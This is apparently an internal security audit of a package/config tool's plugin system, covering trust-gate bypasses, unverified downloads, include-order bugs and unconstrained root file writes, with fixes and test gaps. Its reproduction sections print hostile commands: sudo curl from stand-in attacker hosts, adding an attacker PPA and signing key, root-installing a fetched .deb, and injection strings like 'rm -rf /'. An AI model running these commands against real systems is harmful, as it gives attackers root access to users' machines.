# Review: Security (cross-cutting)

Baseline: `956208e` · 2026-11-08 · reviewer: opus, effort max
Scope: the whole `configsys/` tree read through the security lens (owns no files). Context read:
docs/principles.md, docs/plugins.md, configsys/runner.py. Also read line-by-line for sinks:
plugins.py, layers.py, config.py, routes.py (facets), driver.py, drivers/{apt,dnf,_alt,
native_pkg_file,tarball,appImage,font,script,source,glue,flatpak,snap}.py, versions.py,
reportgen.py, app.py (`_file_issue`), actions.py (`plugin_remove`). Tests read: test_plugin_trust.py,
test_plugin_code.py, test_security*.py (none present), test_plugins.py, test_includes.py,
test_pretend_sweep.py, test_primary_safety.py.

## Carried over from docs/review-2026-09/security.md + docs/review-2026-09/README.md (Tier A)

| earlier finding | status | evidence |
|---|---|---|
| A1 gate command-carrying plugin DATA as code | **partial** | script/source/glue/facets gated (`f066814`, verified), but the NATIVE vendor-source prereqs and the DOWNLOAD drivers are NOT — re-reported as **security-01 / security-02** |
| A2 facets repo/primary-only → trust | fixed | `4e45a8b`, `8a8e5d5`. Reproduced: an untrusted plugin's `facets:` is dropped with an actionable warning (only the repo `gpu` facet survives) |
| A3 `dir_name()` traversal → rmtree | fixed | `7f43966`. `dir_name('github:a/..')=='plugin-91cbbe79'`, `dir_name('github:')=='plugin-72b62ff4'`; `plugin_remove` adds a `pdir.resolve().parent != plugins_dir` guard (actions.py:1336-1341) |
| A4 git option injection (`-`-leading source/ref) | fixed | `7f43966`. `_decl` drops `-`-leading source/ref (plugins.py:74-76); every git command has a `--` separator (plugins.py:1535,1563,1620,1656) |
| A5 include-dedup demotes the user's top config | **open** | reproduced below — **security-03** |
| A6 `$VERSION` (upstream tag) injection | fixed | `_SAFE_VERSION_RE` in `Driver.resolve_version` (driver.py:200-213). Reproduced: `1.0$(reboot)`, `1.0;rm -rf /`, `1.0 && x` all → no match (undiscoverable) |
| A7 no asset checksums | **open** | no per-binding `sha256:` anywhere; folded into **security-02** |
| A8 native-pkg-file predictable `/tmp` as root | fixed | mktemp -d (native_pkg_file.py:124-126), verified |
| A9 `_alt` field quoting | fixed | `shlex.quote` throughout `_alt._repo_lines`/`_alt_install`; but `_alt` still runs untrusted plugin data as root — a different axis (**security-01**) |
| A10 constrain `pubkey-path`/`source-path` to keyring dirs | **open** | an arbitrary root path is still written — **security-04** |
| (2026-09 config-plugins MED) transitive `plugins:` followed for every plugin, not just primary | **open** | **security-05** |
| CRITICAL tarball `rm -rf $HOME` | fixed | `fcafb84`. `Tarball._safe_install_dir` refuses the scope base / shared system dirs (tarball.py:39-55), verified present |

## Cross-cutting themes

- **The A1 command-trust gate was wired into 3 drivers + facets, but the resolver still routes an
  untrusted plugin's bindings to the OTHER command-/root-carrying drivers.** `command_trusted`
  (driver.py:180) is consulted only by `script`, `source`, `glue` (and facets at `routes.load`).
  The native package managers' `ensure_prereqs` (apt/dnf/`_alt` — vendor repo + signing key, as
  root) and the download drivers (`native-pkg-file` root-installs an attacker `.deb`;
  `tarball`/`appImage`/`font` fetch+extract+place-on-PATH) run plugin-supplied data with **no trust
  check at all**. This is the single most important finding: it reopens the exact blast radius A1
  closed, by the drivers A1 didn't touch (security-01, security-02). docs/plugins.md §6 promises
  these are "refused" — they are not (security-07).
- **Integrity is absent on everything downloaded** (A7): the `sha256:` pin covers only the plugin
  *tree*, never a release asset. Every download driver `curl`s a plugin-chosen URL (http allowed)
  and installs/executes the bytes unverified — the delivery mechanism for the above.
- **Attacker reach is multiplied by transitive `plugins:`** (security-05) and by the fact that a
  plugin ADDS a binding to an *already-picked* core component and wins by specificity, so no new
  consent is needed (reproduced against `btop`).
- **Good parts (confirmed, not findings):** A2/A3/A4/A6/A8 fixes all hold; `dir_name` fails closed
  to a hashed name; `plugin_remove` has a containment assert; the code-plugin trust store binds to
  a content hash and fails closed; the merge driver runs isolated; the report path never auto-sends
  and scrubs; there is no `eval`/`exec`/`pickle`/`yaml.load` (only the predicate AST's own `.eval`
  and the trusted `exec_module`).

## Findings

### security-01 [HIGH] security — an untrusted plugin gets ROOT code-exec on install: vendor-source prereqs and native-pkg-file bypass the A1 trust gate
`configsys/drivers/apt.py:142-213` (`ensure_prereqs` — `ppa`/`source-url`/`source-line`/`pubkey-url`/`pubkey-path`), `configsys/drivers/dnf.py:120-180` (`repo-url`/`pubkey-url`), `configsys/drivers/_alt.py:130-192` (`apt-source`/`ppa`), `configsys/drivers/native_pkg_file.py:110-127`; none calls `command_trusted` (driver.py:180). `configsys/drivers/_native.py:80-93` runs `ensure_prereqs` + install under `sudo` with no gate.

A data-only plugin (no `code:`) syncs and loads with **no trust prompt** (`layer_files` admits any synced+ABI-ok plugin). The A1 fix (`f066814`) made `script`/`source`/`glue` refuse their ops from an untrusted layer — but the native drivers never consult `command_trusted`, so an untrusted plugin's binding runs as **root** on `configsys install`/`upgrade`:
- `native-pkg-file`: `sudo … curl <attacker-url>.deb -o $PKG && apt-get install -y $PKG` — the `.deb`'s maintainer scripts run as root. `plugin list` shows the plugin plain `ok` (no "ships recipes"), so this path is entirely silent.
- apt `ensure_prereqs`: `sudo add-apt-repository -y ppa:<attacker>`, `sudo curl <attacker-url> -o <pubkey-path>`, write `<attacker deb line>` to `<source-path>`, `apt-get update` — installs an attacker apt repo + signing key, after which any later `apt` op pulls attacker packages as root. Here `ships_executable_data` *does* flag the plugin "ships recipes — untrusted," yet the commands still run — the label is cosmetic, enforcement is missing.

**(reproduced)** Untrusted plugin adds a narrower binding to the already-picked core component `btop`:
```
$ configsys --home $H --os pop where btop
    - via native-pkg-file  when: pop_os! and cpu: x86_64  url=http://attacker.invalid/btop_$ARCH.deb  <- default here
    default: via native-pkg-file  (by most-specific when:)
$ configsys --home $H --os pop --pretend install demotool --yes
[pretend] sudo D="$(mktemp -d)" && PKG="$D/pkg.deb" && curl -fSL --retry 3 --retry-delay 2 http://attacker.invalid/payload_x86_64.deb -o "$PKG" && apt-get install -y "$PKG" && rm -rf "$D"
```
And apt's prereqs, called directly with an untrusted-plugin `rc.source` (no `--pretend`):
```
command_trusted(rc): False
  sudo add-apt-repository -y ppa:evil/ppa
  [ -f /usr/share/keyrings/evil.gpg ] || sudo curl -fsSL http://evil/key.asc -o /usr/share/keyrings/evil.gpg
  if [ ! -f /etc/apt/sources.list.d/evil.list ]; then sudo curl -fsSL http://evil/evil.list -o /etc/apt/sources.list.d/evil.list && sudo apt-get update; fi
```
`check` reports 0 errors/1 warning for the hijacked tree — nothing flags the untrusted override.

Who/when/privilege/consent: a data plugin the user declared, **or any plugin declared transitively** by one they declared (security-05); fires on `configsys install`/`upgrade` of a component the plugin defines *or shadows*; runs as **root**; the user consented to installing a component, never to an attacker URL or to trusting the plugin. What they could already do without this bug: nothing at this level — A1 gates the equivalent `via: script` binding, so this is a true trust-boundary crossing the project already decided to prevent.

**Fix:** gate every command-/root-carrying driver on the same `command_trusted(rc)` as `script`/`source`/`glue`: call it at the top of `NativePkgManager.ensure_prereqs` (and `_alt.install`, `native_pkg_file.install`), returning `untrusted_command_result(rc)` when a binding that carries `ppa`/`source-*`/`pubkey-*`/`repo-*` (or `via: native-pkg-file`) comes from an untrusted plugin. Extend `_scan_executable_data` to flag `native-pkg-file`/download bindings so `plugin list`/`check` surface them. Best done once in the resolver: drop a command-carrying binding from candidacy when its layer is untrusted (so the label and the behavior can't diverge again). **Effort:** M. **Tier:** A.

**Verified:** CONFIRMED (reproduced). Severity CRITICAL → HIGH. Sandbox `scratch/verify-security/home` has one untrusted data plugin (`plugin list`: `ships recipes — untrusted`). `configsys --home $H --os pop --pretend install demo-script demo-apt --yes` refuses the plugin's `via: script` (`demo-script: refusing to run script commands from the untrusted plugin 'evilplug'`). In the same run it issues that plugin's apt prereqs: `[pretend] sudo add-apt-repository -y ppa:evil/ppa`, `[pretend] [ -f /usr/share/keyrings/evil.gpg ] || sudo curl -fsSL http://evil.invalid/key.asc -o /usr/share/keyrings/evil.gpg`, and `… | sudo tee /etc/apt/sources.list.d/evil.list >/dev/null && sudo apt-get update`. `where btop` shows `via native-pkg-file … <- default here` / `(by most-specific when:)`, and `--pretend install btop` gives `sudo D="$(mktemp -d)" … curl … http://attacker.invalid/btop_x86_64.deb -o "$PKG" && apt-get install -y "$PKG" …`. `check` gives `0 error(s), 2 warning(s)`, and neither warning is about the override. No other guard exists: resolve.py, adapt.py and routecheck.py have no trust check, and A1's commit `f066814` never touched apt/dnf/_alt/native_pkg_file. test_plugin_trust.py covers only the script case. `ships_executable_data` is False for a plugin whose only binding is `native-pkg-file`, so `plugin list` shows it plain `ok`. The reach is narrower than written in one way: detection soft pins keep an already-installed component on its installed method, so a shadowing binding mostly hits picks that aren't installed yet (a fresh machine's `install --picks`). Related: apt's `$CODENAME` branch puts `source-line` unquoted inside double quotes (`echo "{src_line}" | sudo tee`). `_alt` quotes its splice. Quote it when the gate lands. Why the severity changed: in this review series CRITICAL means a benign-path disaster like `rm -rf $HOME`. This one needs a hostile or compromised plugin plus an explicit install, which is the shape 2026-09 rated HIGH (A1). Also, the same untrusted plugin can already run code as the user through the ungated download drivers (security-02), so what this adds is root instead of user on a sudo-capable desktop. It is still the area's top item.

### security-02 [HIGH] security — download drivers fetch + extract + place-on-PATH an untrusted plugin's attacker-URL bytes, unverified, ungated (A7)
`configsys/drivers/tarball.py:115-146` (`install`/`uninstall` `rm -rf` the plugin-chosen `installDir`, extract there), `configsys/drivers/appImage.py:83-112`, `configsys/drivers/font.py:70-90`; `configsys/driver.py:284-299` (`_fetch_and_extract`). No `command_trusted`, no checksum.

Same untrusted-plugin reach as security-01, user privilege: a `via: tarball`/`appImage`/`font` binding downloads a plugin-controlled URL (http accepted — nothing requires https) and extracts/`chmod +x`'s it into an install dir on PATH; the user runs the planted binary next. There is no `sha256:` on any asset (A7) — the plugin's URL is the sole authority, and a MITM on a plaintext `url:` substitutes bytes. A plugin-chosen `installDir` (e.g. `~/.local/bin`) is also `rm -rf`'d on install — the `_safe_install_dir` guard only refuses the scope base and shared system dirs, not an arbitrary user subdir.

**(reproduced)** the `native-pkg-file` half in security-01; the tarball command shape is `rm -rf {installDir} && … && mv {stage} {installDir}` (tarball.py:125-126) with the URL from the binding.

What they could already do: as with security-01, A1 gates the `via: script` equivalent, so an unprompted user-level RCE-on-next-run is a real gap — just one privilege level below security-01.

**Fix:** (a) gate download bindings on `command_trusted` like security-01 (a download-and-run from an untrusted plugin is code); (b) add an optional per-binding `sha256:` verified after download, before extract/install (A7), and refuse a non-`https` `url:` from a plugin layer unless a checksum is present; (c) extend `_safe_install_dir` to refuse any dir not under a configsys-owned app/scope root. **Effort:** M–L (needs the A7 asset-checksum mechanism). **Tier:** A.

**Verified:** CONFIRMED (reproduced). Stays HIGH, and two parts are worse than written. Sandbox `scratch/verify-security/home2` has a data plugin with only `appImage`/`tarball` bindings. `plugin list` shows it plain `ok` (`ships_executable_data` is False). Under `--pretend install`:
1. **appImage** (`scope: system`) gives `sudo … curl … -o /usr/local/bin/demo-appimg.configsys-download && chmod +x … && mv -f …`, then `sudo tmp=$(mktemp -d) && cd "$tmp" && /usr/local/bin/demo-appimg --appimage-extract .DirIcon …`. `AppImage._extract_icon` RUNS the downloaded file during the install. It runs as the user at the default scope and as root under `scope: system` (the runner wraps it in `sudo bash -c`). So this is not "RCE on next run". By docs/plugins.md §6's own dividing line ("does configsys run something from it as a program"), appImage is command-carrying, not inert.
2. **tarball** with `installDir: "~/.local/bin"` gives `rm -rf <home>/.local/bin && mv <home>/.local/bin.configsys-stage <home>/.local/bin`. With `scope: system` + `installDir: /usr/local/bin` it gives `sudo … rm -rf /usr/local/bin && mv …`. Neither is refused. `_safe_install_dir` is a deny-list (the scope bases plus 17 top-level dirs). Install's `rm -rf` has no `.configsys-<comp>.version` marker check, though uninstall has one. routecheck lints only a MISSING installDir, and test_tarball.py covers only the bases and `/opt`. A careless author can hit this, not just a hostile one.
3. **No checksums:** no download driver has a `sha256` (grep), and http is accepted. No shipped route or `~/src/configsys-*` plugin uses an `http://` URL today, so the MITM part is latent.

For tarball and font, the missing trust gate is documented design: §6 lists downloads as inert, and configsys doesn't run those bytes. That part is a policy choice for the user. appImage and the `rm -rf` containment are bugs either way.

### security-03 [HIGH] correctness/security — include-dedup demotes the user's own top config, dropping their scope/pins/picks
`configsys/layers.py:166-187` (`_visit` keys `done` on realpath only, regardless of role); `configsys/config.py:21` (`_MACHINE_ROLES = ('repo','primary','user')` — an `include`-role layer is not consulted for machine settings). Carried from 2026-09 A5.

A lower-precedence layer (a plugin, or the repo) that `include:`s the user's own config path visits it first as role `include`; when the real `user` root is reached it is already in `done` and skipped, so the user's machine settings are read from an `include` layer that `Config` ignores. Only a diagnostics/`check` warning signals it.

**(reproduced)** roots `[(repo,'repo'),(plug,'plugin' — includes user.hu),(user,'user')]`:
```
default_scope (expect system): user         # the user's `scope: system` is lost -> repo value
pins (expect foo->bar): {}                   # the user's pins vanish
ignored warns: ['…/user.hu: `pins:` is ignored here …', '…/user.hu: `scope:` is ignored here …']
```
Who/when: a plugin (or transitive plugin, which knows the well-known `~/.config/configsys/configsys.hu` path) can do this deliberately to strip a user's pins before its own bindings win (compounds security-01); or a careless plugin/scaffold does it by accident.

**Fix:** in `expand_tolerant`/`_visit`, precompute the realpaths of all roots; when an include resolves to a root path, skip it (warn "include of a root layer ignored"), or let a later root *upgrade* the role of an already-visited path. Add a regression test in test_includes.py. **Effort:** S. **Tier:** A.

**Verified:** CONFIRMED (reproduced). Severity MED → HIGH. I ran the real CLI on two sandboxes that differ only in the plugin's `include: "~/.config/configsys/configsys.hu"`. With the include:
- `pin list` goes from `btop -> tarball [local]` to `configsys: no pins set`.
- `picks list` goes from `picks for box (2)` to `picks for this-machine (0)`.
- `config show` goes from `scope system` to `(unset)`, `disabled-drivers snap` to `(unset — built-in default)`, `primary-verify signed` to `off`, and `machine box` to `(unset)`.

One effect goes beyond the finding. The user's top config has a `components: { zzdemo: {} }` tombstone, and `where zzdemo` moves from `defined in ~/.config/configsys/configsys.hu` to `defined in ~/.config/configsys/plugins/incplug/routes.hu`. The plugin now outranks the user's own overrides. Only `check` signals it (`…/configsys.hu: \`pins:\` is ignored here (not permitted from a include layer …)`), and it words the warning against the user's own file. `primary_verify()` feeds sync and push (`actions._verify_primary`, `primarygit._verify`). test_includes.py has no test that includes a root layer. Why the severity changed: a plugin that needs no trust and no install can switch off a security setting this way. `primary-verify` was made top-config-only in 2026-11 G4 precisely so no other layer could turn it off. The same plugin also removes every user veto (pins, tombstones, disabled-drivers). 2026-09 rated this finding HIGH (A5).

### security-04 [LOW] security — `pubkey-path` / `source-path` (and dnf `.repo`) write attacker bytes to an arbitrary root path
`configsys/drivers/apt.py:171-184` (`sudo curl <pubkey-url> -o <pubkey-path>`, `sudo curl <source-url> -o <source-path>`), `configsys/drivers/dnf.py:154-166` (`/etc/yum.repos.d/<repo-id>.repo`). Carried from 2026-09 A10.

`pubkey-path` is an unconstrained destination for attacker-controlled bytes written as root (`-o <any path>`); a plugin binding chooses both the URL and the path, so `pubkey-path: /etc/cron.d/x` (or any root-writable target) is an arbitrary root file write even before the vendor repo is trusted. Reproduced incidentally in security-01 (`-o /usr/share/keyrings/evil.gpg`). Independent of security-01's gate: even a *trusted* plugin should not write keys outside the keyring dirs.

**Fix:** validate at `routecheck` (and defensively in the driver) that `pubkey-path` resolves under `/usr/share/keyrings` or `/etc/apt/keyrings` (or `/etc/apt/trusted.gpg.d`) and `source-path` under `/etc/apt/sources.list.d`; dnf's path is already fixed by `repo-id` — reject a `repo-id` containing `/` or `..`. **Effort:** M. **Tier:** A.

**Verified:** CONFIRMED (reproduced). Severity MED → LOW. In sandbox `scratch/verify-security/home4`, `--pretend install demo-keypath` writes to whatever path the binding names: `[ -f <scratch>/not-a-keyring-dir/key.gpg ] || sudo curl -fsSL … -o <scratch>/not-a-keyring-dir/key.gpg`, and `sudo curl … -o <scratch>/not-a-sources-dir/x.list`. With `--os fedora --pretend install demo-repoid` and `repo-id: "../not-yum-repos-d/x"`, it runs `[ -f /etc/yum.repos.d/../not-yum-repos-d/x.repo ] || printf … | sudo tee …` (dnf rejects only newlines). Nothing validates these fields: grepping routecheck, resolve and routes for `pubkey`, `source-path` and `repo-id` finds nothing, and `check` reports 0 errors. `_alt`'s `apt-source` `key-path`/`list` are unconstrained too. The proposed allowlist is safe for shipped data: routes.hu uses only /usr/share/keyrings (25), /etc/apt/keyrings (1) and /etc/apt/sources.list.d (26), and no `~/src/configsys-*` plugin sets these fields. Why the severity changed: on its own this adds little. Today any plugin binding already reaches root through security-01's ungated prereqs. Once that gate lands, only trusted layers reach this code, and those can already run root commands via `via: script`. What remains is defense in depth against an authoring slip, so fold it into security-01's fix.

### security-05 [LOW] security — transitive `plugins:` are followed for every synced plugin, not just the primary
`configsys/plugins.py:95-116` (`effective_declared`), `:118-147` (`declared_tree`), `:1700-1731` (`sync`) iterate `read_manifest(...).get('plugins')` for every declared entry; `_decl` strips only `primary`. Carried from 2026-09 config-plugins MED; docs/plugins.md §2 says "any plugin may list further plugins."

Any data plugin can pull in an unbounded further set at floating refs (no `sha256`, `ref` may be a branch), each becoming a `plugin`-role layer — a supply-chain fan-out the user never declared, and the reach that turns security-01/02 from "a plugin I added" into "a plugin a plugin I added added." `plugin list` is the only visibility, and it lists them flat.

**Fix:** either follow manifest `plugins:` only for the `primary` entry (matches the older docs intent and the "primary brings your set" model), or require a `sha256:` on a non-primary transitive decl before it loads, and show transitive decls nested under their parent in `plugin sync`/`list`. **Effort:** M. **Tier:** A.

### security-06 [LOW] security — a plugin's `version: { url: … }` spec is fetched (http) during the read-only inspect sweep
`configsys/versions.py:388-396` (`_discover_live` `url` branch → `http_fetch(spec['url'])`), reached from `Driver.resolve_version`/`get_latest` (driver.py:200-213,454) during `inspect`/`configsys versions` for an installed/resolved unit. `http_fetch` (versions.py:62) accepts http.

An untrusted plugin's component with `version: { url: "http://attacker/…" }` causes configsys to GET an attacker-controlled URL during a read-only operation (no install) — a beacon (reveals the machine's IP/presence/timing) and a mild SSRF (the URL may name an internal host). No code execution; the captured text is only regex-scanned.

**Fix:** note in docs that version discovery reads plugin-supplied URLs on the read path; consider refusing a non-`https` `url:`/key fetch that originates from a plugin layer, and/or not probing `get_latest` for an untrusted plugin's unit. **Effort:** S. **Tier:** A.

### security-07 [LOW] docs-vs-code — docs/plugins.md §6 claims vendor-source/recipe data is "refused until trust"; the native + download drivers don't enforce it
`docs/plugins.md:203-209` — "a `via: script`/`source` binding, an apt `source-line:`/`ppa:`/`apt-source:`, any shipped glue … configsys runs these as shell commands, so they need the same trust as code: until you approve the plugin, its recipes and glue are refused." True for `script`/`source`/`glue`/`facets`; **false** for apt/dnf/`_alt` vendor sources and the download drivers (security-01/02). A spec stating an intended behavior the code breaks is a code bug; this entry pairs with security-01's fix (update the doc once the gate covers these drivers). **Effort:** S. **Tier:** E.

## Test gaps
- No regression test asserts that an **untrusted** plugin's `native-pkg-file`/`tarball`/apt-`source-line`/`ppa`/`pubkey-*` binding is refused (the `script`/`source`/`glue` refusal is tested; the native/download drivers are not). Add one per driver mirroring test_plugin_trust.py's script case — it would have caught security-01/02.
- No test for the include-of-a-root-layer demotion (security-03) — add to test_includes.py asserting the user's `scope`/`pins` survive an `include:` of the user config.
- No test that `pubkey-path`/`source-path` outside the keyring/source dirs is rejected (security-04).
- test_pretend_sweep.py covers write paths under `--pretend`; it does not cover the trust-gate paths. Consider a "no untrusted plugin command runs" sweep alongside it.

## Dead code
None found in the security surface. `command_trusted`/`untrusted_command_result` (driver.py) are live (script/source/glue); `ships_executable_data`/`command_source_trusted` are live (plugins.py, actions.py:1485, app.py:327). (The *fix* for security-01 is to add callers, not remove code.)

## ABI / interface candidates
- The fix for security-01/02 touches the `Driver` contract: a cleaner design is for the resolver to drop a command-carrying binding from an untrusted layer (one chokepoint) rather than each driver self-gating — decide this before plugin authors depend on "native bindings run without trust." If kept per-driver, document `command_trusted` as a hook every command-/root-carrying driver MUST call (it is currently de-facto optional), and add it to test/test_abi_surface.py.
- A per-binding `sha256:` asset field (security-02 / A7) is a new, ABI-visible route schema key — introduce it now.

## Questions for the user
1. security-01/02 direction: gate command-/root-carrying bindings as code (refuse until `plugin trust`), matching A1 and the docs — or surface-and-warn only? (The brief's A1 decision was "gate as code"; this extends it to the drivers it missed.)
2. security-05: restrict transitive `plugins:` to the primary plugin (tighter, matches the "primary brings your set" model), or keep the fan-out and require `sha256:` on non-primary transitive decls?
3. A lead for the dotfiles-glue / primary reviewers (verified, not a finding here): primary-plugin glue *is* gated — `Glue.install` checks `command_trusted` and a primary file is subject to `command_source_trusted` — but trust is machine-local and re-arms on any content change, so a freshly-synced primary's new glue needs a re-`trust` before it links. Confirm that matches the intended "whoever can push to your primary runs code as you, only after you trust the new content" model.

## Refuted on verification

None. All four findings in the verification scope were confirmed by reproduction: security-01, security-02, security-03 and security-04 (every CRITICAL/HIGH, plus the MED security findings). security-05, security-06 and security-07 are LOW and were not in scope. Severity changes: security-01 CRITICAL → HIGH, security-03 MED → HIGH, security-04 MED → LOW. The reasons are in each finding's **Verified** line.
